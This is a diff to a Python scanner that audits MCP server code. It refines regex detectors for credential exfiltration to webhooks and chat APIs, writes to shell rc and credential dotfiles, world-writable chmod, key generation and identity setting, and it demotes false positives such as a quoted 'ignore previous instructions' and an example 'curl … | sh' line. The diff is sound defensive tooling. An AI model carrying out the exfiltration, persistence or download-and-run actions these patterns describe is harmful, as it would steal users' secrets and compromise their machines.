@@ -50,9 +50,12 @@ PATTERNS = {
             # Precision: require BOTH a credential noun AND an explicit external
             # destination (URL / webhook / email / bare domain) near a send verb, so a
             # benign sentence like "send the XSRF header" no longer trips it.
+            # 2026-11: `post(?!gres)` — every `postgres://user:password@host` connection
+            # string matched "post…password…@host"; "leak" dropped from the noun-first form
+            # ("Treat the key like a password. If it leaks, revoke it on https://…").
             "regexes": [
-                r"(?:send|post|upload|transmit|forward|leak|exfiltrat)\w*\b.{0,60}?\b(?:api[_-]?key|access[_-]?token|auth[_-]?token|password|secret|credential|private[_-]?key|seed|mnemonic)\b.{0,60}?(?:https?://|wss?://|@[\w.-]+|webhook|discord\.com/api|t\.me/|[a-z0-9-]+\.(?:com|net|io|xyz|ru|cn|sh|dev)\b)",
-                r"\b(?:api[_-]?key|access[_-]?token|password|secret|private[_-]?key|mnemonic|seed\s+phrase)\b.{0,60}?\b(?:send|post|upload|transmit|forward|leak|exfiltrat)\w*\b.{0,60}?https?://",
+                r"(?:send|post(?!gres)|upload|transmit|forward|leak|exfiltrat)\w*\b.{0,60}?\b(?:api[_-]?key|access[_-]?token|auth[_-]?token|password|secret|credential|private[_-]?key|seed|mnemonic)\b.{0,60}?(?:https?://|wss?://|@[\w.-]+|webhook|discord\.com/api|t\.me/|[a-z0-9-]+\.(?:com|net|io|xyz|ru|cn|sh|dev)\b)",
+                r"\b(?:api[_-]?key|access[_-]?token|password|secret|private[_-]?key|mnemonic|seed\s+phrase)\b.{0,60}?\b(?:send|post(?!gres)|upload|transmit|forward|exfiltrat)\w*\b.{0,60}?https?://",
                 r"exfiltrat\w*\b.{0,40}(?:key|token|secret|credential|password)",
             ],
         },
@@ -63,9 +66,12 @@ PATTERNS = {
             "regexes": [
                 r"generate\s+(?:a\s+)?(?:PGP|GPG|SSH|RSA|ECDSA|ed25519)\b.*\bkey\b",
                 r"(?:PGP|GPG|SSH)\s+key\b.*\bgenerat",
-                r"create\s+.*\b(?:private|signing)\s+key\b",
+                # Precision (2026-11): bounded to one clause ("create one. The private key
+                # stays local" is not a generation request).
+                r"\bcreate\s+[^.;\n]{0,40}\b(?:private|signing)\s+key\b",
                 r"gpg\s+--(?:gen-key|generate-key|full-generate-key)",
-                r"ssh-keygen\b",
+                # -Y sign/verify, -l/-F/-R (fingerprint, lookup, remove) are not generation.
+                r"ssh-keygen\b(?![^\n]*\s(?-i:-[YlFR])\b)",
             ],
         },
         {
@@ -73,9 +79,13 @@ PATTERNS = {
             "name": "Sensitive Directory Write",
             "desc": "Writes files to sensitive system directories",
             "regexes": [
-                r"(?:mv|cp|write|save|install|tee|cat\s*>)\s+.*~/\.(?:ssh|gnupg|gpg|aws|kube|docker|npmrc)",
-                r"(?:mv|cp|write|save|install|tee|cat\s*>)\s+.*/\.(?:ssh|gnupg|aws)/",
-                r"(?:mv|cp)\s+\S+\s+~/\.",
+                # Precision (2026-11): \b added — "mcp (else ~/.cache" matched `cp`.
+                r"\b(?:mv|cp|write|save|install|tee|cat\s*>)\s+.*~/\.(?:ssh|gnupg|gpg|aws|kube|docker|npmrc)",
+                r"\b(?:mv|cp|write|save|install|tee|cat\s*>)\s+.*/\.(?:ssh|gnupg|aws)/",
+                # 2026-11: was any `~/.<dir>` — a tool copying into its own dotdir
+                # (`cp out.db ~/.my-tool/`) is not sensitive. Now: shell rc/profile and
+                # credential dotfiles only (persistence + credential-theft targets).
+                r"\b(?:mv|cp)\s+\S+\s+~/\.(?:bashrc|zshrc|zprofile|profile|bash_profile|netrc|pypirc|npmrc|gitconfig|ssh|gnupg|aws|kube|docker|config/autostart)\b",
             ],
         },
         {
@@ -155,7 +165,11 @@ PATTERNS = {
             "desc": "Sets up identity claiming to be the agent or user",
             "regexes": [
                 r"your\s+(?:PGP|GPG)\s+key\s+is\s+your\s+identity",
-                r"(?:set|change|update)\s+.*\b(?:display\s+name|username|identity)\b",
+                # Precision (2026-11): `\b` added ("exchange the identity" matched `change`);
+                # was `set .* username` — unbounded, it matched env-var
+                # setup text ("set ${ENV.tenant}, ${ENV.username}"). Now the target noun
+                # must follow the verb within three plain words.
+                r"\b(?:set|change|update)\s+(?:[\w']+\s+){0,3}(?:display\s+name|username|identity)\b",
                 r"register\s+(?:as|with)\s+(?:your|this)\s+(?:name|identity)",
             ],
         },
@@ -196,7 +210,10 @@ PATTERNS = {
             "desc": "Requests elevated system permissions",
             # bare `sudo` removed — ubiquitous in install docs, not a signal by itself.
             "regexes": [
-                r"chmod\s+[0-7]*7[0-7]*\s",
+                # 2026-11: was any mode containing a 7 — `chmod 700 ~/.config/x` (owner-only,
+                # i.e. hardening) and `chmod 755 dist/index.js` (make a bin executable) were
+                # all 9 hits. Now: world-writable modes (others-digit has the write bit).
+                r"chmod\s+(?:-R\s+)?[0-7]?[0-7][0-7][2367]\b|chmod\s+(?:-R\s+)?(?:a|o)\+w\b",
                 r"(?:request|need|require|grant)\s+(?:full|complete|admin|root|elevated)\s+(?:access|permission|privilege)",
             ],
         },
@@ -264,6 +281,56 @@ DYNAMIC_INPUT = re.compile(
 )
 CODE_EXEC_ID = "code_execution"
 
+# ── Precision layer, 2026-11 rescan ──────────────────────────────────────────
+# Security tooling *describes* attacks: a sanitizer comment that lists the phrase
+# "ignore previous instructions" as something it strips is not an injection. Demote
+# prompt_injection when the same line carries detection/defence vocabulary. Trade-off:
+# an attacker could append such a word to dodge it, so the hit is still REPORTED under
+# `info` (never dropped) — a reviewer reading info still sees it.
+DEFENSIVE_CONTEXT = re.compile(
+    r"\b(?:detect\w*|marker\w*|sanitiz\w*|strip\w*|filter\w*|guard\w*|"
+    r"reject\w*|defen[cs]\w*|mitigat\w*|classif\w*|heuristic\w*)\b",
+    re.IGNORECASE,
+)
+# A capability table that says the server "cannot send" credentials is the opposite of
+# exfiltration. Demote credential_exfil when its send-verb is negated.
+NEGATED = re.compile(
+    r"\b(?:cannot|can't|can\s+not|never|not|no|don't|doesn't|does\s+not|won't|will\s+not|without)"
+    r"\s+(?:\w+\s+){0,2}$",
+    re.IGNORECASE,
+)
+# JS `RegExp.prototype.exec` (`/^Bearer (.+)$/.exec(req.headers…)`) is string matching,
+# not code execution — the single biggest code_execution FP class in the 2026-11 rescan.
+REGEX_EXEC = re.compile(r"(?:/[dgimsuyv]*|\b\w*(?:re|rx|regex|regexp|pattern|pat|matcher|sql|db|stmt|cursor|cur)\w*)\.$", re.IGNORECASE)
+# `new RegExp("^" + x).exec(s)` — dynamic regex construction, then match.
+REGEX_CTOR = re.compile(r"new\s+RegExp\s*\(")
+# subprocess / child_process with an argument *array* and no shell is not shell injection:
+# `subprocess.run(["dig", f"_x.{d}"])`, `spawn(process.execPath, [argv[1]])`.
+SHELL_TRUE = re.compile(r"shell\s*[=:]\s*(?:True|true)|\bexec(?:Sync)?\s*\(|\bos\.system|\bpopen\s*\(", re.IGNORECASE)
+ARRAY_ARGS = re.compile(r"(?:subprocess\.\w+|spawn(?:Sync)?|execFile(?:Sync)?|\bexec)\s*\(\s*(?:\[|['\"\w.]+\s*,\s*\[)")
+SHELL_EXPLICIT = re.compile(r"shell\s*[=:]\s*(?:True|true)")
+# A CLI documenting its *own* `--no-verify`/`--insecure` flag, or a guard that refuses
+# `SSL_VERIFY=false`, is not a bypass. Keep the flag as risk only when it is passed to a
+# real tool (git/curl/npm/pip/…) and the line is not a refusal.
+BYPASS_TOOL = re.compile(r"\b(?:git|curl|wget|npm|pnpm|yarn|pip3?|helm|kubectl|gh|docker)\b[^\n]*--(?:no-verify|insecure)\b")
+GUARD_TEXT = re.compile(r"not\s+allowed|disallow|forbid|refus|must\s+not|never|is\s+rejected|unsupported", re.IGNORECASE)
+# Docs telling you how to authenticate to *this* service ("send `Authorization: Bearer …`")
+# are not exfiltration.
+OWN_AUTH = re.compile(r"\bAuthorization\b|\bBearer\b|\bX-API-Key\b|\bheaders?\b", re.IGNORECASE)
+# Setting your own display name / username is an ordinary account feature of social and
+# messaging MCP servers (2026-11: 5 of 5 hits were "Set your display name", "set your BGG
+# username"). Reported as info; the PGP-identity and register-as forms stay HIGH.
+IDENTITY_SETTER = re.compile(r"^(?:set|change|update)\b", re.IGNORECASE)
+# RFC 2606/6761 reserved names (example.com, *.invalid, *.test) are documentation, never a
+# real collector — a scanner's README showing `curl https://example.invalid/x | sh`.
+RESERVED_HOST = re.compile(r"https?://(?:[\w-]+\.)*(?:example\.(?:com|net|org)|[\w-]+\.(?:invalid|test|example|localhost))\b", re.IGNORECASE)
+# Escape runs that are a known binary magic (a 1x1 GIF/PNG placeholder literal) or one
+# character repeated (`\u2022` x8 as a password-field bullet mask) are not obfuscation.
+BINARY_MAGIC = re.compile(r"GIF8[79]a|\\x89PNG|JFIF|\\xff\\xd8\\xff|RIFF|%PDF")
+# A file that is *about* prompt injection (a scanner's README/rules quoting attack phrasing)
+# is documentation, not a payload.
+INJECTION_TOPIC = re.compile(r"prompt[\s_-]*injection", re.IGNORECASE)
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # Scanner Engine
@@ -275,6 +342,7 @@ def scan(content):
     info = []
     lines = content.split("\n")
     seen = set()
+    injection_doc = len(INJECTION_TOPIC.findall(content)) >= 2
 
     for severity, pattern_groups in PATTERNS.items():
         for pg in pattern_groups:
@@ -304,6 +372,36 @@ def scan(content):
                         is_info = pg["id"] in INFO_IDS
                         if pg["id"] == CODE_EXEC_ID and not DYNAMIC_INPUT.search(line):
                             is_info = True
+                        if pg["id"] == CODE_EXEC_ID:
+                            before = line[:match.start()]
+                            if match.group(0).lower().startswith("exec") and (
+                                    REGEX_EXEC.search(before) or REGEX_CTOR.search(before)):
+                                is_info = True
+                            if ARRAY_ARGS.search(line) and not SHELL_EXPLICIT.search(line):
+                                is_info = True
+                            if match.group(0) == "child_process" and not SHELL_TRUE.search(line):
+                                is_info = True
+                        if pg["id"] == "obfuscation" and (
+                                BINARY_MAGIC.search(line)
+                                or len(set(re.findall(r"\\[xu][0-9a-fA-F]{2,4}", match.group(0)))) == 1):
+                            is_info = True
+                        if pg["id"] == "identity_impersonation" and IDENTITY_SETTER.search(match.group(0)):
+                            is_info = True
+                        if pg["id"] in ("download_execute", "credential_exfil") and RESERVED_HOST.search(line):
+                            is_info = True
+                        if pg["id"] == "prompt_injection" and (
+                                injection_doc or DEFENSIVE_CONTEXT.search(line)
+                                or INJECTION_TOPIC.search(line)):
+                            is_info = True
+                        if pg["id"] == "credential_exfil" and (
+                                NEGATED.search(line[:match.start()]) or OWN_AUTH.search(line)):
+                            is_info = True
+                        if pg["id"] == "auth_bypass":
+                            m0 = match.group(0).lower()
+                            if m0.startswith("--") and not BYPASS_TOOL.search(line):
+                                is_info = True
+                            if GUARD_TEXT.search(line):
+                                is_info = True
                         if is_info:
                             item["severity"] = "INFO"
                             info.append(item)
@@ -387,6 +485,73 @@ def _report(label, text, as_json, out):
 CANDS = ["src/index.ts", "index.ts", "src/server.ts", "server.py", "src/main.py",
          "main.py", "src/index.js", "index.js", "README.md"]
 
+# ── Entry-file selection (2026-11) ───────────────────────────────────────────
+# Fixed paths missed most real servers (monorepos, packages/*/src, Go cmd/, Rust crates/).
+# Pick from the repo's git tree instead: manifests, package.json main/bin targets (mapped
+# from dist/ back to src/), and source files whose names say they define tools/servers.
+CAP_FILES = 10
+CAP_BYTES = 300_000
+MANIFESTS = ("server.json", "manifest.json", "smithery.yaml", "package.json", "pyproject.toml", "README.md")
+SKIP_PATH = re.compile(
+    r"(?:^|/)(?:node_modules|dist|build|out|vendor|\.venv|venv|test|tests|__tests__|spec|examples?|"
+    r"docs?|fixtures?|benchmarks?|\.github|coverage|target)/|\.(?:min|d|test|spec)\.\w+$|_test\.\w+$|"
+    r"(?:^|/)test_\w+\.py$", re.I)
+SRC_EXT = re.compile(r"\.(?:ts|mts|js|mjs|cjs|py|go|rs)$")
+ENTRY_NAME = re.compile(r"(?:^|/)(?:index|server|main|app|cli|__main__|mcp|tools?|handlers?)\.\w+$|tool", re.I)
+
+
+def _resolve(target, paths):
+    target = re.sub(r"^\./", "", target or "")
+    if not target:
+        return []
+    cands = [target]
+    for a, b in (("dist/", "src/"), ("build/", "src/"), ("lib/", "src/")):
+        if target.startswith(a):
+            s = b + target[len(a):]
+            cands += [re.sub(r"\.(?:c|m)?js$", e, s) for e in (".ts", ".mts", ".js")]
+    return [c for c in cands if c in paths]
+
+
+def pick_entry_files(paths, package_json=""):
+    """paths: {path: size} of the repo's blobs. Returns up to CAP_FILES paths to scan."""
+    chosen = []
+    for m in MANIFESTS:
+        for p in paths:
+            if p.lower() == m.lower() or (m == "server.json" and p.endswith("/server.json") and p.count("/") == 1):
+                chosen.append(p)
+    if package_json:
+        try:
+            j = json.loads(package_json)
+            bins = j.get("bin") or {}
+            for t in [j.get("main")] + ([bins] if isinstance(bins, str) else list(bins.values())):
+                chosen += _resolve(t, paths)
+        except (ValueError, AttributeError):
+            pass
+    srcs = [p for p, sz in paths.items()
+            if SRC_EXT.search(p) and not SKIP_PATH.search(p) and (sz or 0) < CAP_BYTES and ENTRY_NAME.search(p)]
+    srcs.sort(key=lambda p: (p.count("/"), len(p)))
+    out = []
+    for p in chosen + srcs:
+        if p not in out:
+            out.append(p)
+    return out[:CAP_FILES]
+
+
+def _github_files(repo):
+    """Tree-API selection (unauthenticated: 60 req/h; set GITHUB_TOKEN to raise it)."""
+    import os
+    hdr = {"User-Agent": "mcp-audit (github.com/eltociear)", "Accept": "application/vnd.github+json"}
+    if os.environ.get("GITHUB_TOKEN"):
+        hdr["Authorization"] = "Bearer " + os.environ["GITHUB_TOKEN"]
+    try:
+        tree = json.loads(urllib.request.urlopen(urllib.request.Request(
+            f"https://api.github.com/repos/{repo}/git/trees/HEAD?recursive=1", headers=hdr), timeout=20).read())
+        paths = {t["path"]: t.get("size", 0) for t in tree.get("tree", []) if t.get("type") == "blob"}
+    except Exception:
+        return None
+    pkg = _fetch(f"https://raw.githubusercontent.com/{repo}/HEAD/package.json") if "package.json" in paths else ""
+    return pick_entry_files(paths, pkg)
+
 
 def main():
     args = sys.argv[1:]
@@ -401,7 +566,8 @@ def main():
     if args and args[0] == "--github":
         repo = args[1]
         got = 0
-        for f in CANDS:
+        files = _github_files(repo) or CANDS  # fixed paths only if the tree API is unavailable
+        for f in files:
             t = _fetch(f"https://raw.githubusercontent.com/{repo}/HEAD/{f}")
             if len(t) >= 80:
                 r = _report(f"{repo}/{f}", t, as_json, out)
